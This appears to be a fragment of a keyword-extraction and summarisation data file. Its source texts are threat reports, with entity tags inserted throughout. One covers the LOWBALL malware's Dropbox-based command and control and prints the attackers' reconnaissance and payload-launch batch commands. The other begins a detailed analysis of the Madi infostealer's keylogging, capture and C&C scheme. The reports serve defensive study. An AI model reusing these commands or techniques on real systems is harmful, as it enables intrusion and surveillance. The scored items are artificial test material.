GET request using [ORG] HTTPS over [ORG] TCP the [CARDINAL] one dropped by the malicious Word documents . However , this is most likely meant to be a mechanism to update the compromised host with a new version of the [PERSON] LOWBALL malware . The threat group monitors its [ORG] Dropbox account for responses from compromised computers . Once the LOWBALL malware calls back to the [ORG] Dropbox account , the attackers will create a file called \u201c [ COMPUTER_NAME]_upload.bat \u201d which contains commands to be executed on the compromised computer . This batch file is then executed on the target computer , with the results uploaded to the attackers \u2019 Dropbox account in a file named \u201c [ COMPUTER_NAME]_download\u201d . We observed the threat group issue the following commands:@echo offdir c:\\ > > % temp%\\downloadipconfig /all > > % temp%\\downloadnet user > > % temp%\\downloadnet user /domain > > % temp%\\downloadver > > % temp%\\downloaddel % 0@echo offdir \" [WORK_OF_ART] c:\\Documents [WORK_OF_ART] and Settings \" > > [WORK_OF_ART] % temp%\\downloaddir \" c:\\Program Files\\ \" > > % temp%\\downloadnet start > > % temp%\\downloadnet localgroup administrator > > % temp%\\downloadnetstat -ano > > % [NORP] temp%\\downloadThese commands allow the threat group to gain information about the compromised computer and the network to which it belongs . Using this information , they can decide to explore further or instruct the compromised computer to download additional malware . We observed the threat group upload a [ORDINAL] second stage malware , known as [ORG] BUBBLEWRAP ( also known as [ORG] Backdoor . APT.FakeWinHTTPHelper ) to their [ORG] Dropbox account along with the following command:@echo offren \" % temp%\\upload \" [PERCENT] audiodg.exestart [PERCENT] % temp%\\audiodg.exedir d:\\ > > % temp%\\downloadsysteminfo > > % temp%\\downloaddel % 0We have previously observed the admin@338 group use [ORG] BUBBLEWRAP . This particular sample connected to the [WORK_OF_ART] CnC domain accounts.serveftp[.]com , which resolved to an [ORG] IP address previously used by the threat using [ORG] HTTP , [ORG] HTTPS , or a SOCKS proxy . This backdoor collects system information , including the operating system version and hostname , and includes functionality to check , upload , and register plugins that can further enhance its capabilities . [ORG] FireEye works closely with security researchers and industry partners to mitigate cyber threats , and we collaborated with [ORG] Dropbox to respond to this activity . The [ORG] Dropbox security team was able to identify this abuse and put countermeasures in place . Our cooperation uncovered what appears to be a [ORDINAL] second , ongoing operation , though we lack sufficient evidence to verify if admin@338 is behind it . The attack lifecycle followed the same pattern , though some of the filenames were different , which indicates that there may be multiple versions of the malware . In addition , while the operation targeting [GPE] Hong [GPE] Kong - based media involved a smaller number of targets and a limited duration , we suspect this [ORDINAL] second operation involves [CARDINAL] up [CARDINAL] to [CARDINAL] 50 targets . At this time , we are unable to identify the victims . In this case , after the payload is delivered via an exploit the threat actor places files ( named upload.bat , upload.rar , and period.txt , download.txt or silent.txt ) in a directory on a [ORG] Dropbox account . The malware beacons to this directory using the hardcoded API token and attempts to download these files ( which are deleted from the Dropbox account after the download):upload.bat , a batch script that the compromised machine will execute upload.rar , a [ORG] RAR archive that contains [CARDINAL] at [CARDINAL] least [CARDINAL] two files : a batch script to execute , and often an executable ( sometimes named rar.exe ) which the batch script will run and almost always uploads the results of download.rar to the cloud storage account silent.txt and period.txt , small files sizes of 0 - 4 bytes that dictate the frequency to check in with the CnCThe threat actor will then download the results and then delete the files from the cloud storage account . [PERSON] LOWBALL is an example of malware that abuses cloud storage services to mask its activity from network defenders . The LOWBALL [ORDINAL] first stage malware allows the group to collect information from victims and then deliver the [ORG] BUBBLEWRAP [ORDINAL] second stage malware to their victims after verifying that they are indeed interesting targets . A version of this article appeared [ORDINAL] first on [ORG] the [ORG] FireEye [ORG] Intelligence [ORG] Center . [ORG] The [ORG] FireEye [ORG] Intelligence [ORG] Center provides access to strategic intelligence , analysis tools , intelligence sharing capabilities , and institutional knowledge based on [DATE] over [DATE] 10 [DATE] years of [ORG] FireEye and [ORG] Mandiant experience detecting , responding to and tracking advanced threats . [ORG] FireEye uses a proprietary intelligence database , along with the expertise of our Threat Intelligence Analysts , to power the Intelligence Center.[1 ] [ORG] FireEye currently tracks this activity as an \u201c uncategorized \u201d group , a cluster of related threat activity about which we lack information to classify with an advanced persistent threat number.[2 ] [ORG] FireEye . Hiding in Plain Sight : [ORG] FireEye and [ORG] Microsoft [ORG] Expose [ORG] Obfuscation [ORG] Tactic . url [ORG] FireEye . HAMMERTOSS : Stealthy Tactics Define a Russian Cyber Threat Group .[4 ] [PERSON] Moran , [PERSON] Ned and [PERSON] Alex [PERSON] Lanstein . [ORG] FireEye . \u201c [WORK_OF_ART] Spear [WORK_OF_ART] Phishing [WORK_OF_ART] the [WORK_OF_ART] News Cycle : [ORG] APT [ORG] Actors [ORG] Leverage [ORG] Interest in the Disappearance of [NORP] Malaysian Flight MH [CARDINAL] 370 . \u201d [DATE] 25 [DATE] March [DATE] 2014 . url research/2014/03 / spear - phishing - the - news - cycle - apt - actors - leverage - interest - in - the - disappearance - of- malaysian - flight - mh-370.html.[5 ] [PERSON] Moran , [PERSON] Ned and [PERSON] Thoufique [PERSON] Haq . [ORG] FireEye . \u201c [WORK_OF_ART] Know [WORK_OF_ART] Your Enemy : [WORK_OF_ART] Tracking [WORK_OF_ART] a [WORK_OF_ART] Rapidly [WORK_OF_ART] Evolving [WORK_OF_ART] APT [WORK_OF_ART] Actor . \u201d [DATE] 31 [DATE] October [DATE] 2013 . [ORG] FireEye . Poison Ivy : Assessing Damage and Extracting Intelligence[6 ] [ORG] BBC [ORG] News . \u201c [GPE] Hong [GPE] Kong student leaders charged over [ORG] Umbrella [ORG] Movement . \u2019 \u201d [DATE] 27 [DATE] August [DATE] 2015 . url [PERSON] Zhao , [PERSON] Shirley , [PERSON] Joyce [PERSON] Ng , and [PERSON] Gloria [PERSON] Chan . \u201c [ORG] University [ORG] of [ORG] Hong [ORG] Kong \u2019s council votes [CARDINAL] 12 - 8 to reject [PERSON] Johannes [PERSON] Chan \u2019s appointment as pro - vice - chancellor . \u201d [DATE] 30 [DATE] September [DATE] 2015 . url hong - kong.[8 ] Wong , [PERSON] Alan . Pro - Democracy [PERSON] Media Company \u2019s Websites Attacked . \u201c Pro - Democracy Media Company \u2019s Websites Attacked . \u201d [ORG] New [ORG] York [ORG] Times . [DATE] 18 [DATE] June [DATE] 2014 . url democracy - media - companys - websites - attacked/.[9 ] \u201c HKU concern group raises proxy fears in key vote . \u201d [ORG] EIJ [ORG] Insight . [DATE] 31 [DATE] August [DATE] 2015 . url entry was posted on Tue [DATE] Dec [DATE] 01 [TIME] 08:00:00 [TIME] EST [DATE] 2015 and filed under Blog , [ORG] Command [ORG] And [ORG] Control , [ORG] FireEye [ORG] Threat [ORG] Intelligence , Latest Blog Posts , [PERSON] Malware , News , Threat Intelligence and Threat Research . Be the [ORDINAL] first to receive information on major cyber attacks from the industry leader!First [ORG] NameLast [ORG] NameEmail [ORG] AddressSubscribeCyber [ORG] Security [ORG] Fundamentals [ORG] Report Security Issue   FacebookLinkedInTwitterGoogle+YouTubeGlassdoorCopyright \u00a9 2015 [ORG] FireEye , [ORG] Inc. All rights reserved . [ORG] Privacy [ORG] & [ORG] Cookies [ORG] Policy [ORG] | [ORG] Safe [ORG] Harbor", "generated_text": "Chinese; an advanced persistent threat; APT; Admin@338; the email; emails; malicious documents; LOWBALL; Dropbox; command; control; CnC; Dropbox; detection; the threat actors; the email; the malware; targets; financial and policy organizations; Hong Kong; the group; organizations; events; lures; malware; RATs; Poison Ivy; malware launchers; attacks; the government; threats; the internet; information; pro-democracy activists; the threat groups; indicators; compromise; detection.", "ref_text": "<START-1>The document describes a spear phishing campaign conducted in August 2015 by a China-based cyber threat group targeting Hong Kong media organizations. The main points are: - The threat group, tracked by FireEye as \"admin@338\", used recent political events in Hong Kong as lures in spear phishing emails containing malware. - The emails had attachments exploiting a Microsoft Office vulnerability to deliver a malware payload called LOWBALL. This malware uses the Dropbox API for command and control. - The LOWBALL abuses Dropbox for command and control (CnC), LOWBALL is used to collect system information and download additional malware like BUBBLEWRAP. This allows the threat actors to gather intelligence and pivot to additional infections. - The threat group is believed to be targeting Hong Kong media groups to monitor networks and gain advance warning of protests or other activities. - FireEye collaborated with Dropbox to uncover potentially a second operation by the group using similar tactics, infecting up to 50 targets. - The use of legitimate services like cloud storage for command and control allows the group to hide its activity and evade detection. - The campaign reflects a focus by China-based groups on targeting Hong Kong media and pro-democracy organizations, likely to monitor their networks and dissent. This attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts. In summary, the document provides an in-depth look at the tactics, techniques and malware used by a sophisticated China-based threat group in a spear phishing campaign against Hong Kong media outlets in 2015. It illustrates the group's abuse of cloud services for stealthy command and control. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5089285714285715, "gpt3/lexical/rouge_rouge2": 0.23318385650224213, "gpt3/lexical/rouge_rougeL": 0.3125, "gpt3/lexical/rouge_rougeLsum": 0.3125, "gpt3_generated_text": ["This article discusses a spear phishing campaign carried out by a China-based cyber threat group in August 2015, targeting Hong Kong-based media organizations. The group, known as \"admin@338,\" used malicious documents containing a malware payload called LOWBALL to infiltrate the organizations' networks. What makes this attack unique is that the malware used Dropbox, a popular cloud storage service, for command and control purposes. This allowed the threat group to hide their activities and evade detection. The group has previously targeted financial and policy organizations, but this campaign specifically targeted media organizations involved in pro-democracy material. The Chinese government likely seeks to monitor these networks to gain advance warning on protests and information on pro-democracy group leaders. The article also mentions that multiple China-based cyber threat groups have targeted international media organizations in the past, particularly those based in Hong Kong. The article concludes by providing technical details on how the malware operates and communicates with the Dropbox service."]}, {"split_name": "val", "sample_id": "val_83", "prompt_text": "Extract the keywords: The ' Madi ' infostealers - a detailed analysisOn [DATE] 17 [DATE] July , we published a blog about [GPE] Madi and the ongoing campaign used to infiltrate computer systems throughout [LOC] the [LOC] Middle [LOC] East that has targeted users in [GPE] Iran , [GPE] Israel , [GPE] Afghanistan and other individuals scattered across the globe . Here is the follow up with a detailed analysis of the infostealer used in the campaign . [ORG] InstallationThe infostealer is installed by [CARDINAL] one of the various downloaders used in the attacks , which can be separated into [CARDINAL] two categories : Downloaders using the social engineering techniques described in our first blog post ( displaying pictures , movies , documents etc . ) to trick the user Downloaders that simply download and install the infostealerBoth types of downloaders copy themselves as \" UpdateOffice.exe \" into the \" [ORG] Printhood \" directory , e.g. : \" C : Documents and Settings%USER%PrintHoodUpdateOffice.exe \" where they start executing . Both the infostealer and downloaders create fake files with random names in their respective folders . The downloaders also drop some files which assist the malware ( see our first blog for details).Only one file will be used by the infostealer : nam.dll . This file is created by the downloader in the \" [WORK_OF_ART] Templates \" directory ( e.g. : \" C : Documents and [PERSON] Settings%USER%Templatesnam.dll \" ) and contains a BOT prefix / build that will be used by the infostealer when connecting to the command and control server ( [ORG] C&C ) . In order to download and install the infostealer , the downloaders connect to the [ORG] C&C server to request an [ORG] HTM page . Older variants use url address]/ASLK / khaki / Abi / UUUU.htm , whereas more recent ones use \" url address]/ASLK / asgari / mah / UeUeUeUe.htm\" . The [ORG] HTM page is a copy of [ORG] Google index , with a double BASE64 encoded executable embedded in the page : The keyword \" tamamshodfile \" at the bottom will be explained in the ' Infostealer analysis ' section below . The downloaders simply parse the [ORG] HTM file , and decode the [PERSON] Base64 payload twice and save the resulting [ORG] PE file as \" iexplore.exe \" in the \" [WORK_OF_ART] Templates \" directory . Once downloaded , the infostealer is executed . Infostealer analysis : Iexplore.exeAll the versions of the infostealer have an Internet Explorer icon , and were written in [GPE] Delphi . The version used in this article , which appears to have been compiled on [DATE] 10 [DATE] June [DATE] 2012 , is packed using UPX [PERSON] 3.08.The file is rather big : [CARDINAL] 415 [PERSON] KB packed , and [CARDINAL] 1.14 MB once unpacked . [CARDINAL] One peculiarity of the infostealer used in the [GPE] Madi campaign is the heavy use of [ORG] Delphi [ORG] Timers . There are [CARDINAL] 52 of them as you can see on the screenshot below:.Numerous bugs were discovered during the analysis of the infostealer . Some of them wo n't be discussedhere as we do n't want to help the authors improve their malware . TForm4.FormCreate : Upon execution , the [ORDINAL] first activity of interest performed by the infostealer happens inside TForm4.FormCreate . It starts with the setup of a keylogger . In order to do so , [GPE] Madi infostealer uses the Windows function \" SetWindowsHookEx \" with the \" WH_KEYBOARD_LL \" Id_Hook . Once the keylogger has been installed , the infostealer reads the \" nam.dll \" file ( dropped by the downloader ) to get the BOT prefix and concatenates it with the computer name . Hereafter this will be referred to as \" BOTID_TMP \" . The final [ORG] BOTID contains some numbers derived from the \" C : \" Volume Serial Number , as we will see later on . The following timers are then disabled in this specific order : Timer1 , Timer16 , [PERSON] Timer18 , Timer17 , Timer20 , Timer19 , [GPE] Timer24 , Timer8 , [ORG] Timer30 , [PRODUCT] Timer31 , [ORG] Timer33 , Timer34 , [ORG] Timer36 , [GPE] Timer37 , [GPE] Timer38 , [ORG] Timer39 , [GPE] Timer40 , [PERSON] Timer41 , [PERSON] Timer44 , [PERSON] Timer45 , Timer46 , Timer48 , [PERSON] Timer49 , Timer50.The malware uses a lot of external files to receive commands , which is another indicator of poor programming skills . Those files are used to inform the malware about the infection status . In order to avoid confusion , hereafter , when referring to a file , it is in the malware directory ( \" [WORK_OF_ART] Templates \" directory ) , unless stated otherwise . The infostealer looks for the following files:\"fsdiskget.dll \" : If found , it enables [LAW] Timer [LAW] 23 \u2013 otherwise , disables it . \"nrbindek.dll \" : If found , it enables [LAW] Timer [LAW] 28 \u2013 otherwise , disables it . \"specialfile.dll \" : If found , it deletes it . \"filesend.xls \" : Does n't actually look for it ; just tries to delete it . \"begirnagir.htp \" : If NOT found , it disables Timer3\"filebind.xls \" : If found , it enables Timer29 \u2013 otherwise , disables it . Next , [PERSON] Timer14 and Timer13 are both disabled . The [GPE] Trojan looks for \" [ORG] First.dll \" , which is created the [ORDINAL] first time the malware is executed . If already present , the code returns from TForm4.FormCreate . Otherwise , the following happens . It creates first.dll with a hardcoded stream of bytes ( not a real .dll , like the .dll mentioned above , as we will see later on when we analyze the timers more [ORG] closely).Like the downloaders , the infostealer also generates fake files with random names . Before returning from TForm4.FormCreate , [CARDINAL] 6 loops will be executed : [ORG] XLS : [CARDINAL] 51 fake [ORG] XLS files with random names ( [CARDINAL] 7 characters ) are generated using a hardcoded stream of bytes . EXE : [CARDINAL] 51 fake [ORG] EXE files with random names ( [CARDINAL] 6 characters ) are generated using a hardcoded stream of bytes . [ORG] DLL : [CARDINAL] 201 fake [ORG] DLL files with random names ( [CARDINAL] 9 characters ) are generated using a hardcoded stream of bytes . TXT : [CARDINAL] 51 fake TXT files with random names ( [CARDINAL] 4 characters ) are generated using a hardcoded stream of bytes . XML : [CARDINAL] 51 fake XML files with random names ( [CARDINAL] 8 characters ) are generated using a hardcoded stream of bytes . [ORG] HTM : [CARDINAL] 51 fake [ORG] HTM files with random names ( [CARDINAL] 8 characters ) are generated using a hardcoded stream of bytes . Keylogger analysis : As mentioned before , the keylogger setup is done in the TForm4.FormCreate . It uses \" SetWindowsHookEx \" with the \" WH_KEYBOARD_LL \" Id_hook to intercept keystrokes . The hook function is rather rudimentary . For instance , it uses the [ORG] GetAsyncKeyState , with the \" [WORK_OF_ART] VK_BACK \" to find out if the victim used backspace . For each typed key , there is a handler to save which key was typed in the keylogger buffer \" poki65_pik_log\":It comes as no real surprise that the keylogger is very basic and makes no use of any advanced technologies . The malware uses [CARDINAL] 52 timers . Therefore , we will group them by actions , in order to make the overall analysis easier to follow . Command and control : [ORG] ProtocolWe are now going to cover all the timers responsible for contacting the [ORG] C&C server and receiving commands to execute on the infected machine , and all the various handlers used to execute actionsaccording to those orders . Note : In many routines , [GPE] Madi creates \" .bat \" files in order to ping the [ORG] C&C server to see if it is up or not and saves the result in a special file . Each file has a different name . If these files are referenced , we will provide the timer number responsible for its creation . The server manager looks like this : The [ORG] GUI was probably rushed , but it serves its purpose . It can be used to create specific tasks for victims . See Timer 12 to see how each command is handled by the infostealer . Timer 1 : Check - inInterval : [CARDINAL] 25 secondsBefore receiving commands , the infostealer connects to the [ORG] C&C to a special page . I call it the check - in routine . Here is the description : Timer 1 gets the [ORG] ApplicationName and concatenates it with \" .pkklm \" ( See Timer 15 description for details on how this file is created ) . It tries to open that file , looking for [ORG] the \" Reply [ORG] From \" string ( when the [ORG] IP responds to a ping ) . If it 's not found , it disables [LAW] Timer [LAW] 1 and returns . If present , the last part of the [ORG] BOTID is generated using the \" C : \" Volume Serial Number . Basically , the API function GetVolumeInformationW is called to get [WORK_OF_ART] the [WORK_OF_ART] Volume [WORK_OF_ART] Serial [WORK_OF_ART] Number , which isthen concatenated to the [ORG] BOTID_TMP generated in the TForm4.FormCreate . Now that the final [ORG] BOTID has been generated , the final URL that is visited is generated as follows : BOTID|COMPUTERNAME|VolumeSerialNumber / dastor / file.htm e.g. : abaanu5|MYCOMPUTER- 8712422C|6D8704FE / dastor / file.htmThe final URL is visited using Internet Explorer ( IE ) instrumentation . ( e.g. : url visited , it enables [LAW] Timer [LAW] 18 , disables [ORG] Timer [ORG] 1 and returns . This is the checking - in process , which can tell the attackers when a victim computer is ready to receive commands . Once the attackers have decided to send commands to the infected computer , a \" das.htm \" will be available in the \" /dastor/ \" folder . Timer 16 : Visit commands pageInterval : [CARDINAL] 25 secondsTimer [CARDINAL] 1 gets the [ORG] ApplicationName and concatenates it with \" .pkxm \" ( ping results from [ORG] Timer [ORG] 11 ) . It tries to open that file , looking for [ORG] the \" Reply [ORG] From \" string ( when the [ORG] IP responds to a ping).If it 's not found , it disables [LAW] Timer [LAW] 16 and returns . [ORG] The [ORG] Final [ORG] BOTID is computed ( see [LAW] Timer [LAW] 1 description ) to build the URL that is visited in order to receive commands . Before visiting that URL , the \" dast.xls \" file is deleted ( see [LAW] Timer [LAW] 17 below).The URL is visited using IE instrumentation . [LAW] Timer [LAW] 17 is enabled , and [ORG] Timer [ORG] 16 disabled . [LAW] Timer [LAW] 17 : Save the command page as \" dast.xls\"Interval : [CARDINAL] 20 secondsNote : During the execution of the [GPE] Madi infostealer , many instances of IE are running . [LAW] Timer [LAW] 17 will go through all the different instances of instrumented IE , looking for pages with \" dastor \" in their title . Once found , the content of the page ( without the title ) is saved as \" dast.xls\" . If nothing is found , it will go to next IE instance , and repeat the checks until no instances are left . If nothing is found , a clean - up routine is launched . At the end of the Timer 17 , it looks for \" - dastor - Windows Internet Explorer \" and different variants ( Internet Explorer ) and sends a \" WM_Close \" [WORK_OF_ART] Message using the \" PostMessageW \" function in order to close the page . Among all those captions , it also looks for \" - 404 - File or directory not found \" and variants of [CARDINAL] 404 pages , if the page was n't found . Once the clean - up is completed , [ORG] Timer [ORG] 17 disables itself and returns . At this point , we have a local file with the commands to execute on the infected machine . [ORG] Timer [ORG] 12 : Command dispatcherThis timer is responsible for parsing the command file . In order to make the description a little easier to follow , here is a sample command file : When executed , [ORG] Timer [ORG] 12 is disabled . The infostealer [GPE] Trojan then checks if the file \" dast.xls \" is present ( created by [ORG] Timer [ORG] 17 , see above).If it 's not present , [ORG] Timer [ORG] 12 is re - enabled and returns . The next stage of the process opens \" dast.xls \" which searches for commands to execute ( see the command file above ) . Lots of commands can be sent simultaneously , meaning [ORG] Timer [ORG] 12 will not stop parsing when one command is found . Here is the full logic of the parsing : [PERSON] PIK : If the command file contains the word \" pik \" , it checks if the status of [ORG] Timer [ORG] 3 is enabled . ( [ORG] Timer [ORG] 3 is a webmail , social network and [ORG] IM screen capture routine . ) If not enabled , [ORG] Timer [ORG] 3 is enabled , and screen monitoring begins . Command parsing continues . If the \" pik \" command is not found , [PERSON] Timer3 is disabled . DESK : If the command file contains the word \" desk \" , it checks if the status of [ORG] Timer [ORG] 13 is enabled . ( [ORG] Timer [ORG] 13 is a screen capture routine . ) If not enabled , [ORG] Timer [ORG] 13 is enabled , and screen monitoring begins . Command parsing continues . If the \" desk \" command is not found , [PERSON] Timer13 is disabled . SOUND : If the command file contains the word \" sound \" , it checks if the status of [ORG] Timer [ORG] 14 is enabled . ( [ORG] Timer [ORG] 14 is a sound recording routine . ) If not enabled , [ORG] Timer [ORG] 14 is enabled , and sound recording begins . Command parsing continues . If the \" sound \" command is not found , [PERSON] Timer14 is disabled . If the command file contains the word \" newfi \" , nothing happens . This is probably a leftover from older code . UPDATE : If the command file contains the word \" update \" , it checks to see if it also contains a version number , which must be different from current version ( \" 1.1.6 \" in the analyzed sample ) . If neither of those [CARDINAL] two conditions are valid , it goes to the next command parsing . The checking routine is very simplistic and assumes that the version number will be higher , not lower . It is therefore possible to downgrade the [GPE] Trojan . If the required update criteria are met , it will create \" [ORG] Update.dll \" . ( [ORG] Update.dll is made from a hardcoded stream of bytes and is n't a valid DLL.)The [GPE] Trojan now locates [LAW] the \" STARTUP \" folder where a copy of the \" UpdateOffice.exe \" ( [PERSON] Trojan downloader ) is found , and executes it using [ORG] ShellExecute . ( In the [ORDINAL] first part of the article , we explained how the downloader downloads and installs the infostealer.)The [GPE] Trojan downloader is necessary in order for updates to occur . If the downloader has been deleted for some reason , the update wo n't be performed . Once executed , [ORG] Timer [ORG] 12 terminates its execution , as the infostealer executable ( iexplore.exe ) will be overwritten by the [GPE] Trojan downloader with a newer version and executed . DELETE : If the command file contains the word \" delete \" , it will create \" delete.dll \" , using exactly the same stream of bytes that is used in \" update.dll\" . The [GPE] Trojan now locates [LAW] the \" STARTUP \" folder where a copy of the \" UpdateOffice.exe \" downloader is located , and deletes it . Once deleted , it then proceeds to terminate itself . At this point , upon the next reboot , the infection is n't restarted . Note : The infostealer does n't restart by itself , allowing an automatic update every time the computer reboots . On the other hand all the other downloader files ( non - malicious ) are still present in the /printhood/ folder . The full folder of the infostealer is still present , as is the malware . BIND : If neither \" update \" nor \" delete \" are found , [ORG] Timer [ORG] 12 checks if the command file contains the word \" bind \" and creates \" nrbindek.dll \" using exactly the same stream of bytes that is used in \" update.dll\" . Nothing else happens at this point . However , as we have seen in the Form creation , upon execution , the malware checks whether \" nrbindek.dll \" is present . If it is present , [ORG] Timer [ORG] 12 will enable [ORG] Timer [ORG] 28.If \" bind \" is n't found , the parsing continues with the next command . DISKGO : If the command file contains the word \" diskgo \" , it will create \" lbdiskgo.dll \" , using exactly the same stream of bytes that is used in \" update.dll \" . Parsing continues with next command . Note : \" lbdiskgo.dll \" is checked by [ORG] Timer [ORG] 42 and [LAW] Timer [LAW] 43.DISKGET : If the command file contains the word \" diskget \" , it will create \" fskdiskget.dll \" , using exactly the same stream of bytes that is used in \" update.dll \" and enable [ORG] Timer 23.Timer [CARDINAL] 12 then checks whether \" specialfile.dll \" is present . If NOT , it will look for the file extensions included in the command that was received . The attackers select from a list of [CARDINAL] 27 extensions that are provided by the [ORG] C&C server , and which can be selected using a Remote Control Tool ( see at the beginning of the [ORG] Timer [ORG] 12 description to view the extensions listed in the sample command file ) . Each file extension is separated by a special marker \" $ [MONEY] .$\" . Timer 12 searches for the \" $ .$ \" marker . If it 's not present , the parsing stops there . If the marker is present , it saves those extensions to the \" specialfile.dll \" and enables [ORG] Timer 26.Note : [ORG] Specialfile.dll is therefore used to tell the malware what file extensions to look for and [ORG] Timer [ORG] 26 will handle diskget . Afterwards , or if specialfile.dll was already present , it will check whether the \" logfi.dll \" is present , and stop parsing commands if it is not . If the file is present , it looks in the command buffer for the word \" file \" and exits the commands parsing if not found . If logfil.dll is present , it will search files on fixed hard drives and remote drives . The authors ' poor programming skills are quite noticeable in this part of the code . It is also interesting to note that it will search for \" MHTML \" files , even if that option is n't available in the Server Control tool , and that they made a duplicate entry in the hardcode list of files that need to be to located ( htm is present twice).File types searched:*.*txt/*.*jpg/*.*doc/*.*pdf/*.*bmp/*.*docx/*.*mdb/*.*xls/*.*csv/*.*html/*.*avi/ * .*mp3/*.*wave/*.*htm/*.*rar/*.*zip/*.*htm ( again?!)/*.*gif/*.*7z/*.*jar/*.*JPEG/*.*mp4/*.*3gp/ * .*dat/*.*MPEG/*.*SWF/*.*WMV/*.*xml/*.*MHTML / Total of [CARDINAL] 29 extensions , with [CARDINAL] one duplicate . [CARDINAL] 27 extensions are present in the Server Control tool and one that is not ( [PERSON] MHTML).It saves the log file as \" logfi.dll \" for each hard drive and creates a backup as \" logfi.dll . [ORG] BMH \" . It will overwrite the logs for each iteration of the loop . It only search files on remote and fixed drives , not on [ORG] USB / external drives ; that 's for the logging part . Once the Parsing is complete , [LAW] Timer [LAW] 12 re - enables itself and exits . MonitoringTimer 3 : [ORG] PIK handler \u2013 Webmail , social network and [ORG] IM screen captureInterval : [TIME] 60 [TIME] seconds . [PERSON] Timer [PERSON] 3 creates a \" begirnagir.htp \" file . It then checks whether the user has been surfing or using the following applications and takes a screen capture if found : gmail , hotmail , yahoo ! mail , google+ , msn messenger , blogger , massenger ( ? ) , profile , icq , paltalk , yahoo ! messenger for the web , skype , facebook . The screen captures are saved as a [ORG] JPG using the following name convention : mm - dd - yyyy - hhnnss . The \" Now \" and \" FormateDateTime \" functions are used . [LAW] Timer [LAW] 13 : DESK handler \u2013 [ORG] Screen captureInterval : [CARDINAL] 3 minutesNote : The [ORG] GUI used to control the bot says [TIME] 2 [TIME] minutes , but the code does n't lie . [ORG] Timer [ORG] 13 takes screen captures [TIME] every [TIME] 3 [TIME] minutes . They are saved using the following name convention : mm - dd - yyyy - hhnnss . The \" Now \" and \" FormateDateTime \" functions are used . The files are in [ORG] JPG format . Timer 14 : SOUND handler \u2013 Recording soundThis timer is responsible for starting the audio recording using the mci * functions from winmm.dll . The following commands are used : \" OPEN NEW TYPE WAVEAUDIO [ORG] ALIAS mysound \" , \" SET mysound [ORG] TIME [ORG] FORMAT [ORG] MS [ORG] BITSPERSAMPLE 8 CHANNELS 1 SAMPLESPERSEC 8000 [ORG] BYTESPERSEC 8000 \" and finally \" RECORD mysound \" . Once the commands are sent , [LAW] Timer [LAW] 30 is enabled , and [ORG] Timer [ORG] 14 returns . [LAW] Timer [LAW] 30 : Started by [ORG] Timer [ORG] 14 ( sound command handler)Interval : [CARDINAL] 60 secondsThis timer does anything apart from start [ORG] Timer [ORG] 31 when it is time to save the recoded audio . [LAW] Timer [LAW] 31 : Started by [ORG] Timer [ORG] 30 ( when it is time to save audio recordings)When sufficient time has passed since the start of audio recording , [ORG] Timer [ORG] 31 disables [ORG] Timer [ORG] 30 , stops the recording by sending the following command : \" STOP mysound\" . To save audio files , it sends the \" [ORG] SAVE mysound \" command . The files are saved using the following name convention : mm - dd - yyyy - hhnnss . The \" Now \" and \" FormateDateTime \" functions are used . The final file is saved as .wav . BMH.Timer [CARDINAL] 31 is then disabled , and [LAW] Timer [LAW] 14 ( Sound handler ) is re - nabled for the next audio recording . [LAW] Timer [LAW] 32 : Set up [CARDINAL] keyloggerInterval : [CARDINAL] 60 secondsEven though the keylogger setup is performed when the application starts , in the [ORG] FormCreate routine [LAW] Timer [LAW] 32 sets up the keylogger every 60 seconds . The details of the keylogger have already been described earlier in this document . Timer 2 : Creation of keylogger logsInterval : [CARDINAL] 10 secondsTimer [CARDINAL] 2 starts by getting the current user name ( GetUserName API Function ) , and then checks if the \" poki65.pik \" file is present . This file is the current ongoing keylogging file . If it 's not present , it looks for \" solt.html \" , which indicates whether the keylogger has created its [ORDINAL] first log yet . If none of those files are present , it means it is the [ORDINAL] first time the keylogger has started logging . The [ORDINAL] first log file is different from subsequent log files , as it contains more information . The [GPE] Madi keylogger files use HTML tags and colors to make them easier to read . For the [ORDINAL] first log , it executes \" cmd.exe /c ipconfig /allcompartments > ipconfig.txt\"It waits [TIME] 5 [TIME] seconds and appends the content of \" ipconfig.txt \" to the [ORG] HTML content that is created . The computer name as well as the current user name is appended to the log , followed by the list of available drives : [FAC] Floppy [FAC] Drive , [FAC] Fixed [FAC] Drive , Network Drive , CD - Rom Drive and [ORG] RAM [ORG] Disk . Finally , a full list of installed software , including security patches , is appended to the log file , as can be seen on the screenshot below : Once this part is completed , it creates a file called \" solt.htm \" containing the word \" wertik\" . It will continue formatting the poki65 log file . At the very beginning you can see the \" Content - Language \" set to \" fa \" , which is [NORP] Persian . This is how the keylogger logs are generated . Timer 4 : Insert time stamps and tags to display screen captures into keylogger logs . Interval : [CARDINAL] 1 millisecondTimer 4 is responsible for inserting [ORG] IMG tags inside the keylogger log . It is also responsible for adding the time stamp taken from the [ORG] C&C server ( see Miscellaneous section , [ORG] Timer [ORG] 7 and 8).Timer 6 : Backup keylogger log for exfiltrationTimer [CARDINAL] 6 searches for the poki65.pik file - the current log session . If not found , it returns . It then looks for the size of the log file . If it is lower than [CARDINAL] 15 [PERSON] KB , it will return . Only log files bigger than [CARDINAL] 15 [PERSON] KB are exfiltrated . If the size criteria is met , they are copied using the following name convention : mm - dd- yyyy - hhnnss . [ORG] HTM . Timer 6 then deletes \" poki65.pik \" and returns . Note : A new log will be created by [ORG] Timer [ORG] 2 ( solt.html tells the keylogger not to list drives , installed software etc . again).DATA STEALINGData stealing is handled by several timers . Each type of stolen data is stored in a special folder in the server . [PERSON] Files exfiltrated to the [ORG] C&C servers are [PERSON] Base64 encoded . BIND : Timer 28 : Started during Form Creation ( related to the [ORG] BIND command)Note : When the infostealer starts , [ORG] Timer [ORG] 28 is enabled if the file \" nrbindek.dll \" is present ( created by the [ORG] BIND command).Timer [CARDINAL] 28 searches for \" * .*exe \" files on all fixed hard drives . For each * EXE * file found that does n't belong to [LAW] the \" [LAW] Windows \" , \" Program Files \" or \" Program Files ( x86 ) \" folders , an entry ( full path to * EXE * file ) isadded to the file filebind.xls . Once the hard drives have been scanned , [GPE] Timer28 returns.Filebind.xls therefore contains all the executables on the fixed hard drives , except from those in Windows and Program Files . Timer 29 : Started during Form Creation ( related to the [ORG] BIND command)Note : The code of this timer is some of the worst that is used in the infostealer . The programming , obfuscated with [ORG] Delphi , is very bad . [LAW] Timer [LAW] 28 generates a list of * EXE * files that do n't belong to [LAW] the \" [LAW] Windows \" , \" Program Files \" or \" Program Files ( x86 ) \" folders . For each entry of that file , [ORG] Timer [ORG] 29 will make a backup of the executables . The * .bind * 